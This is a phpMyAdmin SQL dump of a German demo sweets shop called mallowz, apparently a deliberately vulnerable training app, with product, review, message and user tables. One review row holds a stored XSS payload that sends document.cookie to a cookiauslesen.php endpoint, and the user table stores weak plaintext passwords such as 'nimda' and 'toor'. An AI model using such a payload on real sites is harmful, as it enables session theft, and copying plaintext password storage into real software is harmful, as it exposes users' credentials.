-- phpMyAdmin SQL Dump
-- version 5.1.1
-- https://www.phpmyadmin.net/
--
-- Host: mysql_mallowz_php
-- Erstellungszeit: 25. Jan 2022 um 06:34
-- Server-Version: 5.7.22
-- PHP-Version: 7.4.20

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Datenbank: `mallowz`
--
CREATE DATABASE IF NOT EXISTS `mallowz` DEFAULT CHARACTER SET latin1 COLLATE latin1_swedish_ci;
USE `mallowz`;

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `artikel`
--

DROP TABLE IF EXISTS `artikel`;
CREATE TABLE `artikel` (
  `artikelID` int(11) NOT NULL,
  `artikelname` text CHARACTER SET utf8 COLLATE utf8_german2_ci NOT NULL,
  `kategorie` mediumtext CHARACTER SET utf8 COLLATE utf8_german2_ci NOT NULL,
  `bild` text CHARACTER SET utf8 COLLATE utf8_german2_ci NOT NULL,
  `preis` decimal(19,2) NOT NULL,
  `beschreibung` text CHARACTER SET utf8 COLLATE utf8_german2_ci NOT NULL,
  `gewicht` int(11) NOT NULL,
  `menge` int(11) NOT NULL,
  `beschreibung_lang` text NOT NULL,
  `zutaten` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Daten für Tabelle `artikel`
--

INSERT INTO `artikel` (`artikelID`, `artikelname`, `kategorie`, `bild`, `preis`, `beschreibung`, `gewicht`, `menge`, `beschreibung_lang`, `zutaten`) VALUES
(1, 'Marhsmallows', 'Marshmallow', 'images/products/mallows/product-m001-small.jpg', '3.00', 'Orignal Marshmallows nach alter amerikanischer Tradition. Genießen Sie Marshmallows Classic so, über einem Lagerfeuer geröstet oder aufgelöst im Kakao.\r\n\r\n', 500, 20, 'Orignal Marshmallows nach alter amerikanischer Tradition. Genießen Sie Marshmallows Classic so, über einem Lagerfeuer geröstet oder aufgelöst im Kakao.<br/><br/>\r\n\r\nMarshmallow - auch Mäusespeck genannt- wird aus Eischnee, Geliermittel, Zucker und Aroma hergestellt. Marshmallows sind besonders in den USA beliebt, wo beispielsweise zu Thanksgiving Süßkartoffeln mit Marshmallows dekoriert werden. Oft werden sie vor dem Verzehr auf dem Grill geröstet oder auf Stöcke gespießt und über einem Feuer gedreht.', 'Glukosesirup, Zucker, Maisstärke, Gelatine, Wasser, Stabilisator: E450, Aromen.'),
(2, 'Marshmallow-Stangen', 'Marshmallow', 'images/products/mallows/product-m002-small.jpg', '3.20', 'Marshmallow-Kreation in voller Länge. Unsere Marshmallow-Stangen sind ca. 11 cm lang und haben einen Durchmesser von ca. 2 cm. Der bunte Schaumzucker-Spaß bietet langanhaltenden Genuss - extrasoft in der Konsistenz und extrasüß für wahre Nasch-Fans.', 500, 30, 'Marshmallow-Kreation in voller Länge. Unsere Marshmallow-Stangen sind ca. 11 cm lang und haben einen Durchmesser von ca. 2 cm. Der bunte Schaumzucker-Spaß bietet langanhaltenden Genuss - extrasoft in der Konsistenz und extrasüß für wahre Nasch-Fans.', 'Glukose- Fruktosesirup, Zucker, Gelatine, Wasser, Feuchthaltemittel: Sorbit; Aroma, Maisstärke, Farbstoff: Kurkumin, Echtes Karmin, Brillantblau FCF.'),
(3, 'Marshmallows-Klein', 'Marshmallow', 'images/products/mallows/product-m003-small.jpg', '3.90', 'Klein und fein. Unsere Mini Marshmallows zeigen wahre Größe. Auch wenn sie nur ca. 1,2 cm groß sind, sind die fluffigen Schaumzucker-Stücke mit ihrem leckeren Vanille-Geschmack echte Nasch-Giganten. Denn in Kakao und Pudding, auf Eis, Muffins und Torten erweisen sie sich als vielseitiges Deko-Element und sind auch pur ein luftig-zarter Genuss.\r\n', 500, 10, 'Klein und fein. Unsere Mini Marshmallows zeigen wahre Größe. Auch wenn sie nur ca. 1,2 cm groß sind, sind die fluffigen Schaumzucker-Stücke mit ihrem leckeren Vanille-Geschmack echte Nasch-Giganten. Denn in Kakao und Pudding, auf Eis, Muffins und Torten erweisen sie sich als vielseitiges Deko-Element und sind auch pur ein luftig-zarter Genuss.', 'Glukosesirup, Zucker, Maisstärke, Gelatine, Wasser, Stabilisator: E450, Aromen.'),
(4, 'Lakritzschnecken', 'Lakritz', 'images/products/lakritz/product-l001-small.jpg', '4.20', 'Diese Lakritzschnecken sind unser Klassiker. Die zusammengerollten Schnüre aus dem schwarzen Gold der Süßholzwurzel überzeugen jeden Lakritzliebhaber, denn sie schmecken süß und würzig. Rollen Sie die Schnecken ab und genießen Sie die Schnüre ganz langsam oder beißen Sie direkt am Stück hinein.', 500, 20, 'Diese Lakritzschnecken sind unser Klassiker. Die zusammengerollten Schnüre aus dem schwarzen Gold der Süßholzwurzel überzeugen jeden Lakritzliebhaber, denn sie schmecken süß und würzig. Rollen Sie die Schnecken ab und genießen Sie die Schnüre ganz langsam oder beißen Sie direkt am Stück hinein.', 'Brauner Zuckersirup; WEIZENMEHL; Glukosesirup; Stärke; Süßholzextrakt (3 %); Aroma; Kochsalz; Überzugsmittel: Bienenwachs weiß und gelb, Carnaubawachs. Kann Spuren von Milch enthalten.'),
(5, 'Konfekt bunt', 'Lakritz', 'images/products/lakritz/product-l002-small.jpg', '4.90', 'Bunt gemischt ist unser Konfekt der variantenreiche Naschspaß für Jung und Alt. Die köstlichen Rollen und Quadrate verbinden softes Konfekt und würziges Lakritz in süß-salzigen Kombinationen. In den Geschmacksrichtungen Kokos, Kakao, Zitrone, Saftorange, Karamell und Himbeere sind sie auf Partys, beim gemütlichen Couch-Abend oder einfach so zwischendurch im Handumdrehen vernascht.', 500, 20, 'Bunt gemischt ist unser Konfekt der variantenreiche Naschspaß für Jung und Alt. Die köstlichen Rollen und Quadrate verbinden softes Konfekt und würziges Lakritz in süß-salzigen Kombinationen. In den Geschmacksrichtungen Kokos, Kakao, Zitrone, Saftorange, Karamell und Himbeere sind sie auf Partys, beim gemütlichen Couch-Abend oder einfach so zwischendurch im Handumdrehen vernascht.', 'Zutaten: Zucker; brauner Zuckersirup; Glukosesirup; WEIZENMEHL; MILCHZUCKER; Stärke; Dextrose; Palmfett; Kokosraspeln (7,5 % bei den weißen und orangen Konfektstücken); MAGERMILCHPULVER; Süßholzextrakt (3 % bezogen auf den Lakritzanteil); fettarmes Kakaopulver; Gelatine; Aroma; Kochsalz; Frucht- und Pflanzenkonzentrate: Apfel, Rote Beete, Karotte, Paprika, Saflor, Kürbis, Tomate; Karamellsirup; Überzugsmittel: Bienenwachs weiß und gelb, Carnaubawachs; Säuerungsmittel: Citronensäure.'),
(6, 'Lakritzrolle', 'Lakritz', 'images/products/lakritz/product-l003-small.jpg', '4.20', 'Stückchen für Stückchen. Der Klassiker erfreut sich seit vielen Jahrzehnten großer Beliebtheit. Mit unseren Lakritzstangen  erhalten Sie den erfolgreichen Lakritzartikel in mundgerechten, ca. 4 cm langen Stücken. Eine Kombination aus fruchtiger Konfektmasse trifft wie gewohnt auf einen herrlich würzigen Lakritzmantel. Unsere Lakritzrollen sind die Mischung mit den Geschmacksrichtungen Kokos, Zitrone, Saftorange und Himbeere - jeweils lecker kombiniert mit Lakritz.', 500, 10, 'Stückchen für Stückchen. Der Klassiker erfreut sich seit vielen Jahrzehnten großer Beliebtheit. Mit unseren Lakritzstangen  erhalten Sie den erfolgreichen Lakritzartikel in mundgerechten, ca. 4 cm langen Stücken. Eine Kombination aus fruchtiger Konfektmasse trifft wie gewohnt auf einen herrlich würzigen Lakritzmantel. Unsere Lakritzrollen sind die Mischung mit den Geschmacksrichtungen Kokos, Zitrone, Saftorange und Himbeere - jeweils lecker kombiniert mit Lakritz.', 'Zutaten: Brauner Zuckersirup; Glukosesirup; Zucker; WEIZENMEHL; Stärke; MILCHZUCKER; Dextrose; Kokosraspeln; Süßholzextrakt (3 % bezogen auf den Lakritzanteil); MAGERMILCHPULVER; Palmfett; Aroma; Kochsalz; Gelatine; Frucht- und Pflanzenkonzentrate: Apfel, Rote Beete, Paprika, Karotte, Saflor, Tomate, Kürbis; Säuerungsmittel: Citronensäure; Überzugsmittel: Bienenwachs weiß und gelb, Carnaubawachs.'),
(7, 'Fruchtsaftbären', 'Fruchtgummi', 'images/products/fruchtgummi/product-f001-small.jpg', '3.20', 'Was lange währt, bleibt gut. Unsere Fruchtsaftbären sind das Synonym für Fruchtgummi und ganz klar die Klassiker unter den Süßigkeiten. Die Form und ihre weiche Konsistenz machen die fruchtigen Bären unverwechselbar - und das weltweit. Sie glänzen mit den Geschmacksrichtungen Erdbeere, Apfel, Zitrone, Orange, Ananas und Himbeere.  ', 500, 20, 'Was lange währt, bleibt gut. Unsere Fruchtsaftbären sind das Synonym für Fruchtgummi und ganz klar die Klassiker unter den Süßigkeiten. Die Form und ihre weiche Konsistenz machen die fruchtigen Bären unverwechselbar - und das weltweit. Sie glänzen mit den Geschmacksrichtungen Erdbeere, Apfel, Zitrone, Orange, Ananas und Himbeere.  ', 'Zutaten: Glukosesirup; Zucker; Gelatine; Dextrose; Fruchtsaft aus Fruchtsaftkonzentrat: Apfel, Erdbeere, Himbeere, Orange, Zitrone, Ananas; Säuerungsmittel: Citronensäure; Frucht- und Pflanzenkonzentrate: Saflor, Spirulina, Apfel, Holunderbeere, Orange, Schwarze Johannisbeere, Kiwi, Zitrone, Aronia, Mango, Passionsfrucht, Traube; Aroma; Holunderbeerextrakt; Überzugsmittel: Bienenwachs weiß und gelb, Carnaubawachs. Kann Spuren von Milch, Weizen enthalten.'),
(8, 'Geleefrüchte', 'Fruchtgummi', 'images/products/fruchtgummi/product-f002-small.jpg', '3.20', 'Ein fruchtiger Genuss: Der Geschmack dieses Fruchtgelees mit seinem klaren, intensiven Aroma. Erleben Sie die herrlich frische Zitrone und das duftig-exotische Zusammenspiel von Pfirsich mit Maracuja. Und wenn Sie Himbeeren so lieben wie wir, führt kein Weg an unseren roten Gelée-Früchtchen vorbei.', 500, 100, 'Ein fruchtiger Genuss: Der Geschmack dieser Fruchtwürfel mit ihrem klaren, intensiven Aroma. Erleben Sie die herrlich frische Zitrone und das duftig-exotische Zusammenspiel von Pfirsich mit Maracuja. Und wenn Sie Himbeeren so lieben wie wir, führt kein Weg an unseren roten Gelée-Würfelchen vorbei. Lassen Sie den Geschmack dieser Früchte auf der Zunge zergehen und entdecken Sie eine Intensität, die sich der gewissenhaften Selektion der Früchte, der handwerklichen Sorgfalt und dem großen Können der Süßwaren-Kunst verdankt.', 'Zucker, Wasser, Apfelmark, Feuchthaltemittel: Sorbitsirup, Glukosesirup, Invertzuckersirup, \r\n                Himbeermark (0,4%), Holunderbeerenextrakt, Zitronensaftkonzentrat (0,5%), natürliches Zitronenaroma, natürliche Aromen, Maracujasaftkonzentrat (0,3%), Pfirsichstücke (0,3%), \r\n                Säuerungsmittel: Citronensäure, Geliermittel: Agar Agar.<br/><br/>\r\n                <b>Informationen für Allergiker:</b> Kann Spuren von Schalenfrüchten und Soja enthalten. Vor Wärme schützen und trocken lagern.'),
(9, 'Englisches Weingummi', 'Fruchtgummi', 'images/products/fruchtgummi/product-f003-small.jpg', '4.20', 'Unser Weingummi ist ein einzigartiges Weingummi-Dessert mit echtem Wein. Da der Alkohol im enthaltenen Wein vollständig verkocht, können auch die kleinen Feinschmecker das leckere Fruchtgummi genießen. Auf den aromatisch fruchtigen Weingummistücken sehen Sie die Namen der bekanntesten deutschen Weinbaugebiete. Englisches Weingummi - eine Genießer-Auslese. Lecker weich und fruchtig, leicht sauer und trotzdem süß.', 500, 20, 'Unser Weingummi ist ein einzigartiges Weingummi-Dessert mit echtem Wein. Da der Alkohol im enthaltenen Wein vollständig verkocht, können auch die kleinen Feinschmecker das leckere Fruchtgummi genießen. Auf den aromatisch fruchtigen Weingummistücken sehen Sie die Namen der bekanntesten deutschen Weinbaugebiete. Englisches Weingummi - eine Genießer-Auslese. Lecker weich und fruchtig, leicht sauer und trotzdem süß.', 'Zutaten: Glukosesirup; Zucker; Gelatine; Dextrose; Säuerungsmittel: Citronensäure; Frucht- und Pflanzenkonzentrate: Saflor, Apfel, Rettich, Spirulina, Süßkartoffel, Karotte, Zitrone, Schwarze Johannisbeere, Hibiskus; Wein; Aroma; Überzugsmittel: Bienenwachs weiß und gelb, Carnaubawachs; Invertzuckersirup. Kann Spuren von Milch, Weizen enthalten.');

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `bewertung`
--

DROP TABLE IF EXISTS `bewertung`;
CREATE TABLE `bewertung` (
  `bewertungID` int(11) NOT NULL,
  `userID` int(11) NOT NULL,
  `artikelID` int(11) NOT NULL,
  `datum` date NOT NULL,
  `sterne` int(11) NOT NULL,
  `text` text CHARACTER SET utf8 COLLATE utf8_german2_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Daten für Tabelle `bewertung`
--

INSERT INTO `bewertung` (`bewertungID`, `userID`, `artikelID`, `datum`, `sterne`, `text`) VALUES
(1, 11, 8, '2021-12-21', 3, 'Dieses Fruchtgelee ist der totale Knaller.'),
(2, 9, 8, '2021-12-21', 2, 'Diese Fruchtgelee ist der totale Knaller für das freie Volk.'),
(3, 13, 1, '2021-12-21', 3, '<script>document.write(\"<img src=\'http://localhost:9000/cookieauslesen.php?cookie=\"+ document.cookie+\"\' height=0 width=0>\");</script> Hackernoon.');

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `messages`
--

DROP TABLE IF EXISTS `messages`;
CREATE TABLE `messages` (
  `msgID` int(11) NOT NULL,
  `msgUserID` int(11) NOT NULL,
  `msgSenderID` int(11) NOT NULL,
  `msgDate` date NOT NULL,
  `msgSubject` text CHARACTER SET utf8 COLLATE utf8_german2_ci NOT NULL,
  `msgContent` text CHARACTER SET utf8 COLLATE utf8_german2_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Daten für Tabelle `messages`
--

INSERT INTO `messages` (`msgID`, `msgUserID`, `msgSenderID`, `msgDate`, `msgSubject`, `msgContent`) VALUES
(1, 2, 3, '2019-12-18', 'Deine Email', '<p>Hallo Jens,<br style=\"\"><br style=\"\">danke für deine email.<br style=\"\">Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commodo ligula eget dolor. Aenean massa. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Donec quam felis, ultricies nec, pellentesque eu, pretium quis, sem. Nulla consequat massa quis enim. Donec pede justo, fringilla vel, aliquet nec, vulputate eget, arcu. In enim justo, rhoncus ut, imperdiet a, venenatis vitae, justo. Nullam dictum felis eu pede mollis pretium. Integer tincidunt. Cras dapibus. Vivamus elementum semper nisi. Aenean vulputate eleifend tellus. Aenean leo ligula, porttitor eu, consequat vitae, eleifend ac, enim. Aliquam lorem ante, dapibus in, viverra quis, feugiat a, tellus. Phasellus viverra nulla ut metus varius laoreet. Quisque rutrum. Aenean imperdiet.</p><p><br>Deine Sandra<br><br></p>'),
(2, 2, 4, '2019-12-18', 'Macht ist geil', '<p>Hallo Jens ,<br style=\"\"><br style=\"\">Du sollst wissen:<br style=\"\">Macht ist geil!<br style=\"\"><br style=\"\">Herzlose Grüße,<br style=\"\">Cersei<br></p>'),
(3, 2, 5, '2019-12-18', 'Alle sollen brennen...', '<p>Hallo Jens ,<br style=\"\"><br style=\"\">danke für deine email.<br style=\"\">Ich habe sie verbrannt. Und den Raben, der sie überbracht hat. Alle sollen brennen.<br style=\"\"><br style=\"\">Flammende Grüße,<br style=\"\">Daeny<br></p>'),
(4, 2, 6, '2019-12-18', 'Bock auf Wein ?', '<p>Hallo Jens,<br style=\"\"><br style=\"\">ich hätte da noch ein paar Flaschen Dornischen.<br style=\"\">Garantiert mit meinem schicken Gift versetzt. Also - wenn du Bock hast, melde dich doch mal.<br style=\"\"><br style=\"\">Es grüßt die Schlange aus dem Süden,<br style=\"\">Ellaria<br></p>'),
(5, 2, 7, '2019-12-18', 'Rosengarten', '<p>Hallo Jens,<br style=\"\"><br style=\"\">ich habe so sehr auf deine Mail gewartet.<br style=\"\">Die Lannisters sind alle doof - aber dir verspreche in (m)einen Rosengarten.<br style=\"\"><br style=\"\">Blumige Grüße,<br style=\"\">Margaery<br></p>'),
(6, 2, 8, '2019-12-18', 'Hoch im Norden', '<p>Hallo Jens,<br style=\"\"><br style=\"\">danke für deine email.<br style=\"\">Wir haben Nordlichter. Komm uns gerne besuchen.<br style=\"\"><br style=\"\">Funkelnde Grüße,<br style=\"\">Sansa<br></p>'),
(7, 2, 9, '2019-12-18', 'Wo ist Jon ?', '<p>Hallo Jens,<br style=\"\"><br style=\"\">weisst du, wo Jon ist? Bitte melde dich!<br style=\"\"><br style=\"\">Frostige Grüße,<br style=\"\">Ygritte<br></p>'),
(8, 2, 10, '2019-12-18', 'Kennst du Bronn ?', '<p>Hallo Jens,<br style=\"\"><br style=\"\">weisst du, wo Bronn ist? Eigentlich fand ich den ganz süß, den alten Schlawiner!<br style=\"\"><br style=\"\">Herzliche Grüße,<br style=\"\">Tyene<br></p>'),
(14, 15, 1, '2022-01-05', 'Willkommen im Forum', '<p>Hallo tildas, <br/><br/>das Mallowz-Team freut sich, dich an Bord zu haben. Wir mÃ¶chten dich bitten, zwei Regeln einzuhalten:<br/><br/>1) Sei hilfreich, nicht verletztend. Wenn jemandes Ausdruck nicht perfekt ist, behandele ihn/sie bitte nicht schlecht.<br/>2) Wenn du eine Frage stellst, schreib das Thema bitte in den Betreff.<br/><br/>Das wars auch schon! Viel SpaÃŸ im Forum,<br/><br/>der Mallowz-Admin</p>');

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `user`
--

DROP TABLE IF EXISTS `user`;
CREATE TABLE `user` (
  `userID` int(11) NOT NULL,
  `username` text CHARACTER SET utf8 COLLATE utf8_german2_ci NOT NULL,
  `email` text CHARACTER SET utf8 COLLATE utf8_german2_ci NOT NULL,
  `password` text CHARACTER SET utf8 COLLATE utf8_german2_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Daten für Tabelle `user`
--

INSERT INTO `user` (`userID`, `username`, `email`, `password`) VALUES
(1, 'admin', 'admin@mallowz.de', 'nimda'),
(2, 'jens', 'jens@jensgaulke.de', '123'),
(3, 'sandra', 'sandra@vallana.net', '123'),
(4, 'cersei', 'cersei@lannister.ws', 'got'),
(5, 'daenerys', 'daenerys@targayen.ws', 'got'),
(6, 'ellaria', 'ellaria@sand.ws', 'got'),
(7, 'margaery', 'margaery@tyrell.ws', 'got'),
(8, 'sansa', 'sansa@stark.ws', 'got'),
(9, 'ygritte', 'ygritte@freefolk.ws', 'got'),
(10, 'tyene', 'tyene@martell.ws', 'got'),
(11, 'jon', 'jon@snow.ws', '123'),
(12, 'guest', 'guest', 'orange'),
(13, 'root', 'root@mallowz.de', 'toor'),
(14, 'editor', 'editor@mallowz.de', '1qay2wsx'),
(15, 'tildas', 'tildas@tilda.de', '123');

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `userdata`
--

DROP TABLE IF EXISTS `userdata`;
CREATE TABLE `userdata` (
  `userID` int(11) NOT NULL,
  `vorname` varchar(30) CHARACTER SET utf8 COLLATE utf8_german2_ci NOT NULL,
  `nachname` varchar(30) CHARACTER SET utf8 COLLATE utf8_german2_ci NOT NULL,
  `avatar` text CHARACTER SET utf8 COLLATE utf8_german2_ci NOT NULL,
  `contactpic` text CHARACTER SET utf8 COLLATE utf8_german2_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Daten für Tabelle `userdata`
--

INSERT INTO `userdata` (`userID`, `vorname`, `nachname`, `avatar`, `contactpic`) VALUES
(1, 'Admin', 'Admin', './images/avatar/avatar-m.png', './images/avatar/avatar-m.png\r\n'),
(2, 'Jens', 'Gaulke', './images/avatar/avatar-m.png', './images/contacts/jens.jpg'),
(3, 'Sandra', 'Vallana-Gaulke', './images/avatar/avatar-f.png', './images/contacts/sandra.jpg'),
(4, 'Cersei', 'Lannister', './images/avatar/avatar-f.png', './images/contacts/cersei.jpg'),
(5, 'Daenerys', 'Targayen', './images/avatar/avatar-f.png', './images/contacts/daenerys.jpg'),
(6, 'Ellaria', 'Sand', './images/avatar/avatar-f.png', './images/contacts/ellaria.jpg'),
(7, 'Margaery', 'Tyrell', './images/avatar/avatar-f.png', './images/contacts/margaery.jpg'),
(8, 'Sansa', 'Stark', './images/avatar/avatar-f.png', './images/contacts/sansa.jpg'),
(9, 'Ygritte', 'Freefolk', './images/avatar/avatar-f.png', './images/contacts/ygritte.jpg'),
(10, 'Tyene', 'Martell', './images/avatar/avatar-f.png', './images/contacts/tyene.jpg'),
(11, 'Jon', 'Snow', './images/avatar/avatar-m.png', './images/avatar/avatar-m.png\r\n'),
(12, 'Gast', 'Gast', './images/avatar/avatar-m.png', './images/avatar/avatar-m.png\r\n'),
(13, 'Root', 'Root', './images/avatar/avatar-m.png', './images/avatar/avatar-m.png'),
(14, 'Editor', 'Editor', './images/avatar/avatar-m.png', './images/avatar/avatar-m.png'),
(15, 'Tilda', 'Swinton', './images/avatar/avatar-m.png', './images/avatar/avatar-m.png');

--
-- Indizes der exportierten Tabellen
--

--
-- Indizes für die Tabelle `artikel`
--
ALTER TABLE `artikel`
  ADD PRIMARY KEY (`artikelID`);

--
-- Indizes für die Tabelle `bewertung`
--
ALTER TABLE `bewertung`
  ADD PRIMARY KEY (`bewertungID`);

--
-- Indizes für die Tabelle `messages`
--
ALTER TABLE `messages`
  ADD PRIMARY KEY (`msgID`);

--
-- Indizes für die Tabelle `user`
--
ALTER TABLE `user`
  ADD PRIMARY KEY (`userID`);

--
-- Indizes für die Tabelle `userdata`
--
ALTER TABLE `userdata`
  ADD PRIMARY KEY (`userID`);

--
-- AUTO_INCREMENT für exportierte Tabellen
--

--
-- AUTO_INCREMENT für Tabelle `messages`
--
ALTER TABLE `messages`
  MODIFY `msgID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=15;

--
-- AUTO_INCREMENT für Tabelle `user`
--
ALTER TABLE `user`
  MODIFY `userID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=16;

--
-- AUTO_INCREMENT für Tabelle `userdata`
--
ALTER TABLE `userdata`
  MODIFY `userID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=16;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
